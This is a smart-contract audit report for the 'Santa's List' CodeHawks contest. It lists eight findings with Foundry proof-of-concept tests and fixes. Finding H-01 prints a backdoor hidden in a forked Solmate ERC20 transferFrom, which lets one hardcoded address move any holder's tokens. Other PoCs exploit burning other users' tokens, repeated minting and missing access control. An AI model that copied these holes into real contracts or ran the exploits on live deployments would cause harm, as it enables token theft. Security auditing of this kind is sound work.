# First Flight #5: Santa's List - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Malicious Code Injection in solmate ERC20 Contract inside `transferFrom` function which is inherited in `SantaToken`](#H-01)
    - ### [H-02. SantasList::buyPresent burns token from presentReceiver instead of caller and also sends present to caller instead of presentReceiver.](#H-02)
    - ### [H-03. Users can mint NFT infinite times due to weak duplicacy check in SantasList::collectPresent function](#H-03)
    - ### [H-04. SantasList::collectPresent can be called by anyone even if they are not checked by santa due to mishandling of Status enum](#H-04)
    - ### [H-05.  Anyone can check the list by calling SantasList::checkList and update the `s_theListCheckedOnce` mapping](#H-05)
- ## Medium Risk Findings
    - ### [M-01. Cost to buy NFT via SantasList::buyPresent is 2e18 SantaToken but it burns only 1e18 amount of SantaToken](#M-01)
    - ### [M-02. enum Status does not contain `UNKNOWN` status](#M-02)
- ## Low Risk Findings
    - ### [L-01. Missing events emission in certain functions of SantasList contract](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clpba0ama0001ywpabex01hrp)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 2
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Malicious Code Injection in solmate ERC20 Contract inside `transferFrom` function which is inherited in `SantaToken`            

### Relevant GitHub Links
	
https://github.com/PatrickAlphaC/solmate-bad/blob/c3877e5571461c61293503f45fc00959fff4ebba/src/tokens/ERC20.sol#L87-L96

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L11

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/.gitmodules#L7-L9

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/foundry.toml#L7

## Summary
A malicious code is detected in a modified version of the Solmate ERC20 contract inside the `transferFrom` function. The library was forked from the Solmate repository and has been modified to include the malicious code. The `SantaToken` contract inherits this malicious ERC20 contract which brings all the risks inside the SantaToken contract that are associated with the modified ERC20 contract.

The code is modified in such a way to allow a specific address to transfer tokens without checking for allowances and thus it causes token transfers without the permission of the users.

## Vulnerability Details
Instead of using the official [Solmate's](https://github.com/transmissions11/solmate) ERC20 contract a [forked Solmate](https://github.com/patrickalphac/solmate-bad/tree/c3877e5571461c61293503f45fc00959fff4ebba) library was used which contains the modified ERC20 contract.

The vulnerability arises due to the usage of unofficial solmate repo which was forked from official solmate containing a commit involving the malicious code injected inside the `transferFrom` function of the Solmate's ERC20 contract.

The malicious code added to the `transferFrom` function allows a specific Ethereum address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer tokens from any other address to a target address. This is done without checking the approval status of the `from` address. This could lead to unauthorized token transfers, potentially draining accounts without the account owner's consent.

The address `0x815F577F1c1bcE213c012f166744937C889DAF17` is the same address of the `South Pole Elves` mentioned in the `@author` field for the Smart Contracts [here](https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L55).

The malicious code starts from the line 87 to line 96 inside the `transferFrom` in the modified Solmate's ERC20 contract.
```cpp
function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
@>  // hehehe :)
@>  // https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
@>  if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
@>      balanceOf[from] -= amount;
@>      unchecked {
@>          balanceOf[to] += amount;
@>      }
@>      emit Transfer(from, to, amount);
@>      return true;
@>  }

    uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

    if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

    balanceOf[from] -= amount;

    // Cannot overflow because the sum of all user
    // balances can't exceed the max uint256 value.
    unchecked {
        balanceOf[to] += amount;
    }

    emit Transfer(from, to, amount);

    return true;
}
```

## Impact
This vulnerability allows the attacker (with the ethereum adress - `0x815F577F1c1bcE213c012f166744937C889DAF17`) to arbitrarily transfer tokens from any address to any other address without requiring approval from the `from` address to attacker's address. This can lead to significant financial loss for token holders and can undermine the trust in the SantaToken.

Since the malicious code is present in ERC20 contract which is inherited in `SantaToken` which will allow the attacker to arbitrarily transfer SantaToken from any address to any other address and use the stolen SantaToken to buy present. Furthermore, if there are any other services which can be availed with SantaToken, then attacker can benefit from all of them.

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`.

Run the test:
```cpp
forge test --mt test_ElvesCanTransferTokenWithoutApprovals
```

```cpp
function test_ElvesCanTransferTokenWithoutApprovals() public {
    // address of the south pole elves
    address southPoleElves = 0x815F577F1c1bcE213c012f166744937C889DAF17;

    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // User collects their NFT and tokens for being EXTRA_NICE
    vm.prank(user);
    santasList.collectPresent();

    // Now the user have some SantaTokens
    uint256 userBalance = santaToken.balanceOf(user);
    assertEq(userBalance, 1e18);

    // user needs to give approval to others in order to move tokens to other addresses via 'transferFrom'
    // but the south pole elves can move tokens of anyone without approval permissions
    vm.prank(southPoleElves);
    bool success = santaToken.transferFrom(user, southPoleElves, userBalance);

    assert(success == true);
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santaToken.balanceOf(southPoleElves), userBalance);
}
```

## Tools Used
Manual Review

## Recommendations
- Santa should first identify the specific elves who were responsible for the malicious code and start their counselling as soon as possible and teach them a nice lesson so that they don't write smart contracts with malicious intent and should also motivate them to apply to Cyfrin Updraft.
- Use the ERC20 contract from the official Solmate's library. Always verify the code before it is used in the SmartContract and always use code from official source.
- Delete the malicious forked solmate library from the `lib` folder.
- Refactor the library installs in every place.

- `Makefile (Line - 13)`
```diff
- install :; forge install foundry-rs/forge-std --no-commit && forge install openzeppelin/openzeppelin-contracts --no-commit && forge install patrickalphac/solmate-bad --no-commit
+ install :; forge install foundry-rs/forge-std --no-commit && forge install openzeppelin/openzeppelin-contracts --no-commit && forge install transmissions11/solmate --no-commit
```

- `foundry.toml`
```diff
remappings = [
    '@openzeppelin/contracts=lib/openzeppelin-contracts/contracts',
-   '@solmate=lib/solmate-bad',
+   '@solmate=lib/solmate',
]
```

- `.gitmodules`
```diff
[submodule "lib/forge-std"]
	path = lib/forge-std
	url = https://github.com/foundry-rs/forge-std
[submodule "lib/openzeppelin-contracts"]
	path = lib/openzeppelin-contracts
	url = https://github.com/openzeppelin/openzeppelin-contracts
-[submodule "lib/solmate-bad"]
-	path = lib/solmate-bad
-	url = https://github.com/patrickalphac/solmate-bad
+[submodule "lib/solmate"]
+	path = lib/solmate
+	url = https://github.com/transmissions11/solmate
```
## <a id='H-02'></a>H-02. SantasList::buyPresent burns token from presentReceiver instead of caller and also sends present to caller instead of presentReceiver.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172

## Summary
The `buyPresent` function sends the present to the `caller` of the function but burns token from `presentReceiver` but the correct method should be the opposite of it. 
Due to this implementation of the function, malicious caller can mint NFT by burning the balance of other users by passing any arbitrary address for the `presentReceiver` field and tokens will be deducted from the `presentReceiver` and NFT will be minted to the malicious caller.

Also, the NatSpec mentions that one has to approve `SantasList` contract to burn their tokens but it is not required and even without approving the funds can be burnt which means that the attacker can burn the balance of everyone and mint a large number of NFT for themselves.

`buyPresent` function should send the present (NFT) to the `presentReceiver` and should burn the SantaToken from the caller i.e. `msg.sender`.

## Vulnerability Details
The vulnerability lies inside the SantasList contract inside the `buyPresent` function starting from line 172.

The buyPresent function takes in `presentReceiver` as an argument and burns the balance from `presentReceiver` instead of the caller i.e. `msg.sender`, as a result of which an attacker can specify any address for the `presentReceiver` that has approved or not approved the SantasToken (it doesn't matter whether they have approved token or not) to be spent by the SantasList contract, and as they are the caller of the function, they will get the NFT while burning the SantasToken balance of the address specified in `presentReceiver`.

This vulnerability occurs due to wrong implementation of the buyPresent function instead of minting NFT to presentReceiver it is minted to caller as well as the tokens are burnt from presentReceiver instead of burning them from `msg.sender`.

Also, the NatSpec mentions that one has to approve `SantasList` contract to burn their tokens but it is not required and even without approving the funds can be burnt which means that the attacker can burn the balance of everyone and mint a large number of NFT for themselves.

```cpp
/* 
 * @notice Buy a present for someone else. This should only be callable by anyone with SantaTokens.
 * @dev You'll first need to approve the SantasList contract to spend your SantaTokens.
 */
function buyPresent(address presentReceiver) external {
@>  i_santaToken.burn(presentReceiver);
@>  _mintAndIncrement();
}
```

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`

Run the test:
```cpp
forge test --mt test_AttackerCanMintNft_ByBurningTokensOfOtherUsers
```

```cpp
function test_AttackerCanMintNft_ByBurningTokensOfOtherUsers() public {
    // address of the attacker
    address attacker = makeAddr("attacker");

    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // User collects their NFT and tokens for being EXTRA_NICE
    vm.prank(user);
    santasList.collectPresent();

    assertEq(santaToken.balanceOf(user), 1e18);

    uint256 attackerInitNftBalance = santasList.balanceOf(attacker);

    // attacker get themselves the present by passing presentReceiver as user and burns user's SantaToken
    vm.prank(attacker);
    santasList.buyPresent(user);

    // user balance is decremented
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santasList.balanceOf(attacker), attackerInitNftBalance + 1);
}
```

## Impact
- Due to the wrong implementation of function, an attacker can mint NFT by burning the SantaToken of other users by passing their address for the `presentReceiver` argument. The protocol assumes that user has to approve the SantasList in order to burn token on their behalf but it will be burnt even though they didn't approve it to `SantasList` contract, because directly `_burn` function is called directly by the `burn` function and both of them don't check for approval.
- Attacker can burn the balance of everyone and mint a large number of NFT for themselves. 

## Tools Used
Manual Review, Foundry Test

## Recommendations
- Burn the SantaToken from the caller i.e., `msg.sender`
- Mint NFT to the `presentReceiver`

```diff
+ function _mintAndIncrementToUser(address user) private {
+    _safeMint(user, s_tokenCounter++);
+ }

function buyPresent(address presentReceiver) external {
-   i_santaToken.burn(presentReceiver);
-   _mintAndIncrement();
+   i_santaToken.burn(msg.sender);
+   _mintAndIncrementToUser(presentReceiver);
}
```

By applying this recommendation, there is no need to worry about the approvals and the vulnerability - 'tokens can be burnt even though users don't approve' will have zero impact as the tokens are now burnt from the caller. Therefore, an attacker can't burn others token.
## <a id='H-03'></a>H-03. Users can mint NFT infinite times due to weak duplicacy check in SantasList::collectPresent function            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L151

## Summary
- Users are restricted to collect NFT only 1 time as stated in the docs but due to weak duplicacy check inside the SantasList::collectPresent function, one can mint NFT as many times they want by transferring their NFT to their alternate address and bypassing the weak duplicacy check as it will fail because the user now has 0 balance of NFT after transferring, thus again minting a NFT by calling collectPresent function. 
This will lead to minting of the NFT as many times a user want, thus going against the protocol rules set by Santa.

- Also, one can collect NFT and transfer it to other `NICE` or `EXTRA_NICE` person and tease them to not be able to mint NFT even though they have not collected it by calling the `collectPresent` function but they can collect it by transferring the NFT to address(0).

## Vulnerability Details
The vulnerability is due to the weak duplicacy check present inside the function SantasList::collectPresent function at line 151. The check is not strong enough to check for duplicate minting of NFT by a user.
As the check just validate the user's nft balance if it is zero or not, the nft minted by `collectPresent` function can be transferred to another address by calling `transferFrom` function on the SantasList contract leaving the NFT balance to 0, thus  `collectPresent` function can be again called as the check will fail as the user's NFT balance is 0 due transferring it to another address, thus collectPresent can be called again and again, and NFT can be minted as many times.

```
function collectPresent() external {
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
@>  if (balanceOf(msg.sender) > 0) {
        revert SantasList__AlreadyCollected();
    }
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement();
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement();
        i_santaToken.mint(msg.sender);
        return;
    }
    revert SantasList__NotNice();
}
```

## PoC
Refactor the import in file `test/unit/SantasListTest.t.sol`: (Vm is used to get array to get the Log array to store recorded event logs)
```cpp
import {Test} from "forge-std/Test.sol";
```
to
```cpp
import {Vm, Test} from "forge-std/Test.sol";
```
Add the test in the file `test/unit/SantasListTest.t.sol` Run the test:
```cpp
forge test --mt test_UsersCanMintInfiniteNft_By_TransferingItToTheirOtherAddress
```

```cpp
function test_UsersCanMintInfiniteNft_By_TransferingItToTheirOtherAddress() public {
    // the alternate address of user
    address userAlternateAddr = makeAddr("userAlternateAddr");

    vm.startPrank(santa);

    // Santa checks user once
    santasList.checkList(user, SantasList.Status.NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME());

    vm.recordLogs();

    // user collects the present
    vm.prank(user);
    santasList.collectPresent();

    Vm.Log[] memory logs = vm.getRecordedLogs();
    uint256 tokenId = uint256(logs[0].topics[3]);

    // once the user collects present, they should not be able to collect it again
    // but due to the weak check in codebase, users can trick the codebase by transfering
    // their minted NFT to their alt. address and thus bypassing the check

    // user transfers their nft to other address
    vm.prank(user);
    santasList.transferFrom(user, userAlternateAddr, tokenId);

    // now the balance of the user's nft becoeme 0 and they can bypass the duplicate nft check
    // user again calls the collect present function and mints an nft
    vm.recordLogs();
    vm.prank(user);
    santasList.collectPresent();

    logs = vm.getRecordedLogs();
    uint256 newTokenId = uint256(logs[0].topics[3]);

    assert(newTokenId != tokenId);
    assertEq(santasList.ownerOf(newTokenId), user);

    // thus the user was able to mint nft twice
    // they can continue to mint nft as many times they want by transferring their prev nft
    // to their alt. address followed by calling collectPresent and so on and so forth
}
```

## Impact
- The Santa allows a `NICE` or `EXTRA_NICE` person to mint NFT a single time by calling the collectPresent function but due to the weak check the protocol can be tricked and NFT can be minted as many times, thus it violates the protocol rules and hence it creates high impact on the protocol as well as on Santa.
- Also, malicious users can tease `NICE` or `EXTRA_NICE` to not be able to mint NFT by transferring their NFT to their address and as their NFT balance becomes > 0, thus they can't collect their present as collectPresent function call will revert.

## Tools Used
Manual Review, Foundry Test

## Recommendations
Instead of checking the user's NFT balance, add a mapping to check whether a user has collected the present or not. (Remember to follow the CEI pattern)
```diff
+ mapping(address => bool) private s_presentCollected;

function collectPresent() external {
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
-   if (balanceOf(msg.sender) > 0) {
-       revert SantasList__AlreadyCollected();
-   }
+   if (s_presentCollected[msg.sender]) {
+       revert SantasList__AlreadyCollected();
+   }
+   s_presentCollected[msg.sender] = true;
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement();
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement();
        i_santaToken.mint(msg.sender);
        return;
    }
    revert SantasList__NotNice();
}
```
Now, it doesn't depend on the user's NFT balance and one can't collect NFT the other time as it only allows the eligible users to call it once.
## <a id='H-04'></a>H-04. SantasList::collectPresent can be called by anyone even if they are not checked by santa due to mishandling of Status enum            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L69

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L79-L80

## Summary
In the SantasList contract only those users are allowed to collect present who are checked twice by santa but even though if the user is not checked twice by santa then also users can collect their present due mishandling of the Status enum .

In enum Status, NICE is present at 0th position, also the mapping `s_theListCheckedOnce` and `s_theListCheckedTwice` store the default value 0 by default which means everyone will be NICE by default in both the mapping and they can call the collectPresent function even though they are not even checked by santa and get the NFT.

## Vulnerability Details
This vulnerability exists in the SantasList::Status enum in the SantasList.sol file starting on line 69. The Status has NICE at 0th position and as both the mapping starting from line 79 and ending at 80 will have 0 as their default values which corresponds to NICE of the Status enum, therefore every user will be NICE by default and they can call the `collectPresent` function on SantasList contract and collect the NFT without even getting checked by Santa.

```cpp
/*//////////////////////////////////////////////////////////////
                             TYPES
//////////////////////////////////////////////////////////////*/
enum Status {
    NICE,
    EXTRA_NICE,
    NAUGHTY,
    NOT_CHECKED_TWICE
}

/*//////////////////////////////////////////////////////////////
                        STATE VARIABLES
//////////////////////////////////////////////////////////////*/
mapping(address person => Status naughtyOrNice) private s_theListCheckedOnce;
mapping(address person => Status naughtyOrNice) private s_theListCheckedTwice;
```

## Impact
The Santa only wants to allow those users to call collectPresent function which are checked by him as NICE or EXTRA_NICE but if a user who is not checked by him should not be able to call it and it should revert. 

But due the mishandling of Status enum, everyone will be NICE by default, so all the unchecked users will be NICE and they will be able to mint the NFT by calling the collectPresent function

## PoC

Refactor the import in file `test/unit/SantasListTest.t.sol`:   (Vm is used to get array to get the Log array to store recorded event logs)
```
import {Test} from "forge-std/Test.sol";
```
to
```
import {Vm, Test} from "forge-std/Test.sol";
```
Add the test in the file `test/unit/SantasListTest.t.sol`
Run the test:
```cpp
forge test --mt test_AnyoneCanGetPresentEvenIfTheyAreNotChecked_AsTheStatusEnumWillBeNiceByDefault
```
```cpp
function test_AnyoneCanGetPresentEvenIfTheyAreNotChecked_AsTheStatusEnumWillBeNiceByDefault() public {
    // santa does nothing and the user remains unchecked

    // assert check for both mapping
    assert(santasList.getNaughtyOrNiceOnce(user) == SantasList.Status.NICE);
    assert(santasList.getNaughtyOrNiceTwice(user) == SantasList.Status.NICE);

    // initially user holds no nft
    assertEq(santasList.balanceOf(user), 0);

    vm.recordLogs();

    // user collects the present without even getting checked by santa
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME());
    vm.prank(user);
    santasList.collectPresent();

    Vm.Log[] memory logs = vm.getRecordedLogs();
    // Getting the token id from Transfer event, it will be the first event to get triggered present at idx 0
    // the token id is indexed parameter which is at 3rd position
    uint256 tokenId = uint256(logs[0].topics[3]);

    uint256 userNftBalance = santasList.balanceOf(user);
    address ownerOfNft = santasList.ownerOf(tokenId);

    // user gets minted their santa nft and their balance increases from 0 to 1
    assertEq(userNftBalance, 1);
    assertEq(ownerOfNft, user);
}
```

## Tools Used
Manual Review, Foundry Test

## Recommendations
In the `Status` enum of SantasList contract, move `NOT_CHECKED_TWICE` to 0th position, so that every user will now be not checked by default as it will be at 0th position and both mapping `s_theListCheckedOnce` and `s_theListCheckedTwice` will now be NOT_CHECKED_TWICE by default.

```diff
enum Status {
+   NOT_CHECKED_TWICE,
    NICE,
    EXTRA_NICE,
    NAUGHTY
-   NOT_CHECKED_TWICE
}
```
## <a id='H-05'></a>H-05.  Anyone can check the list by calling SantasList::checkList and update the `s_theListCheckedOnce` mapping            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L121

## Summary
In the SantasList contract only Santa is to be allowed to call SantasList::checkList but anyone call the function as it lags necessary access control. The SantasList::checkList() function modifies the s_theListCheckedOnce mapping, thus anyone can update it as the function doesn't have access control check.

## Vulnerability Details
This vulnerability exists in the SantasList::checkList function in the SantasList.sol file starting on line 121.
The function checkList lags the access control to only allow santa to call it as a result of which anyone can call the function

```cpp
/* 
 * @notice Do a first pass on someone if they are naughty or nice. 
 * Only callable by santa
 * 
 * @param person The person to check
 * @param status The status of the person
 */
function checkList(address person, Status status) external {
    // @audit no santa check
    s_theListCheckedOnce[person] = status;
    emit CheckedOnce(person, status);
}
```

## Impact
The contract NatSpec mentions that only santa is allowed to call the checkList function but anyone can call it leading to unwanted changing of the user's status and make it difficult for the user to collect their present.

## PoC
- Include the below event in the test/unit/SantasListTest.t.sol file just before setUp function.
```cpp
event CheckedOnce(address person, SantasList.Status status);
```

- Include the below tests in the file test/unit/SantasListTest.t.sol

Run it by: 
```cpp
forge test --mt test_AnyoneCanCallCheckList
```
The below test involves notSanta as the attacker who checks the List as there is no access control.
```cpp 
function test_AnyoneCanCallCheckList() public {
    address notSanta = makeAddr("notSanta");
    address niceGuy = makeAddr("niceGuy");

    vm.prank(notSanta);
    vm.expectEmit(false, false, false, true, address(santasList));
    emit CheckedOnce(niceGuy, SantasList.Status.NAUGHTY);
    santasList.checkList(niceGuy, SantasList.Status.NAUGHTY);

    SantasList.Status status = santasList.getNaughtyOrNiceOnce(niceGuy);
    assert(status == SantasList.Status.NAUGHTY);
}
```

Run it by: 
```cpp
forge test --mt test_MissingAccessControlForCheckList_MakesItDifficultForOneToCollectPresent
```
```cpp
function test_MissingAccessControlForCheckList_MakesItDifficultForOneToCollectPresent() public {
    // the attacker who checks the list due to missing access control
    address badElf = makeAddr("badElf");

    vm.startPrank(santa);

    // Santa Checks User Once
    santasList.checkList(user, SantasList.Status.NICE);

    // Santa Checks User Second Time
    santasList.checkTwice(user, SantasList.Status.NICE);

    vm.stopPrank();

    // Now as the user is checked twice by santa they are fully eligible to collect their exciting present 🎁

    // But Bad Elf changed the user's status of s_theListCheckedOnce to something else
    vm.prank(badElf);
    santasList.checkList(user, SantasList.Status.NAUGHTY);

    // User tries to get the present, but it will not work as badElf messed up and it will revert
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME());
    vm.prank(user);
    vm.expectRevert(
        SantasList.SantasList__NotNice.selector
    );
    santasList.collectPresent();
}
```

## Tools Used
Manual Review, Foundry Tests

## Recommendations
Add the required access control `onlySanta` check to the SantasList::checkList function.
```diff
+ function checkList(address person, Status status) external onlySanta {
    s_theListCheckedOnce[person] = status;
    emit CheckedOnce(person, status);
}
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Cost to buy NFT via SantasList::buyPresent is 2e18 SantaToken but it burns only 1e18 amount of SantaToken            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L173

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L28

## Summary
- The cost to buy NFT as mentioned in the docs is 2e18 via the `SantasList::buyPresent` function but in the actual implementation of buyPresent function it calls the SantaToken::burn function which doesn't take any parameter for amount and burns a fixed 1e18 amount of SantaToken, thus burning only half of the actual amount that needs to be burnt, and hence user can buy present for their friends at cheaper rates.
- Along with this the user is able to buy present for themselves but the docs mentions that present can be bought only for other users.

## Vulnerability Details
The vulnerability lies in the code in the function `SantasList::buyPresent` at line 173 and in `SantaToken::burn` at line 28.

The function `burn` burns a fixed amount of 1e18 SantaToken whenever `buyPresent` is called but the true value of SantaToken that was expected to be burnt to mint an NFT as present is 2e18.

```cpp
function buyPresent(address presentReceiver) external {
@>  i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
}
```

```cpp
function burn(address from) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
@>  _burn(from, 1e18);
}
```

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`.

Run the test:
```cpp
forge test --mt test_UsersCanBuyPresentForLessThanActualAmount
```

```cpp
function test_UsersCanBuyPresentForLessThanActualAmount() public {
    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // user collects their present
    vm.prank(user);
    santasList.collectPresent();

    // balance after collecting present
    uint256 userInitBalance = santaToken.balanceOf(user);

    // now the user holds 1e18 SantaToken
    assertEq(userInitBalance, 1e18);

    vm.prank(user);
    santaToken.approve(address(santasList), 1e18);

    vm.prank(user);
    // user buy present
    // docs mention that user should only buy present for others, but they can buy present for themselves
    santasList.buyPresent(user);

    // only 1e18 SantaToken is burnt instead of the true price (2e18)
    assertEq(santaToken.balanceOf(user), userInitBalance - 1e18);
}
```

## Impact
- Protocol mentions that user should be able to buy NFT for 2e18 amount of SantaToken but users can buy NFT for their friends by burning only 1e18 tokens instead of 2e18, thus NFT can be bought at much cheaper rate which is half of the true amount that was expected to buy NFT.
- User can buy a present for themselves but docs strictly mentions that present can be bought for someone else.

## Tools Used
Manual Review, Foundry Test

## Recommendations
Include an argument inside the `SantaToken::burn` to specify the amount of token to burn and also update the `SantasList::buyPresent` function with updated parameter for `burn` function to pass correct amount of tokens to burn.

- Update the `SantaToken::burn` function
```diff
-function burn(address from) external {
+function burn(address from, uint256 amount) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
-   _burn(from, 1e18);
+   _burn(from, amount);
}
```
- Update the `SantasList::buyPresent` function
```diff
+ error SantasList__ReceiverIsCaller();

function buyPresent(address presentReceiver) external {
+   if (msg.sender == presentReceiver) {
+       revert SantasList__ReceiverIsCaller();
+   }
-   i_santaToken.burn(presentReceiver);
+   i_santaToken.burn(presentReceiver, PURCHASED_PRESENT_COST);
    _mintAndIncrement();
}
```
## <a id='M-02'></a>M-02. enum Status does not contain `UNKNOWN` status            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L69

## Summary
The enum Status does not contain the status `UNKNOWN`. It is mentioned in the docs that there are  NICE, EXTRA_NICE, NAUGHTY, UNKNOWN status but the `Status` enum doesn't contain the `UNKNOWN` status.

## Vulnerability Details
The vulnerability is present in the Status enum which doesn't contain the `UNKNOWN` status, as a result of which Santa will not be able to mark people as `UNKNOWN`.

## Impact
Santa will not be able to mark people as `UNKNOWN`

## Tools Used
Manual Review

## Recommendations
Include the category UNKNOWN to the Status enum.
```diff
enum Status {
    NICE,
    EXTRA_NICE,
    NAUGHTY,
    NOT_CHECKED_TWICE,
+   UNKNOWN
}
```

# Low Risk Findings

## <a id='L-01'></a>L-01. Missing events emission in certain functions of SantasList contract            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L147

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172

## Summary
SantasList::collectPresent() and SantasList::buyPresent() does not emit an event, so the changes made by these will not be tracked and off-chain database will not be in proper sync with on-chain data.

## Vulnerability Details
The function collectPresent and buyPresent updates the contract state but they lag event emission as a result of which the changes made on-chain are not tracked off-chain.
```cpp
function collectPresent() external {
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
    if (balanceOf(msg.sender) > 0) {
        revert SantasList__AlreadyCollected();
    }
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement();
@>   
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement();
        i_santaToken.mint(msg.sender);
@>
        return;
    }
        revert SantasList__NotNice();
}
```

```cpp
function buyPresent(address presentReceiver) external {
    i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
@>
}
```
## Impact
When the state is initialized or modified, an event needs to be emitted. Any state that is initialized or modified without an event being emitted is not visible off-chain. This means that any off-chain service is not able to view changes. 
Over here the changed made to state of contract by the `collectPresent` and `buyPresent` function will not be tracked off-chain as both the functions lags necessary event emission

## Tools Used
Manual Review

## Recommendations
Emit an event in the function for the necessary state changes.
```diff
+ event PresentCollected(address receiver, Status receiverStatus); 

function collectPresent() external {
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
    if (balanceOf(msg.sender) > 0) {
        revert SantasList__AlreadyCollected();
    }
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement();
+       emit PresentCollected(msg.sender, Status.NICE);
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement();
        i_santaToken.mint(msg.sender);
+       emit PresentCollected(msg.sender, Status.EXTRA_NICE);
        return;
    }
        revert SantasList__NotNice();
}
```

```diff
+ event PresentBought(address from, address receiver);

function buyPresent(address presentReceiver) external {
    i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
+   emit PresentBought(msg.sender, presentReceiver);
}
```


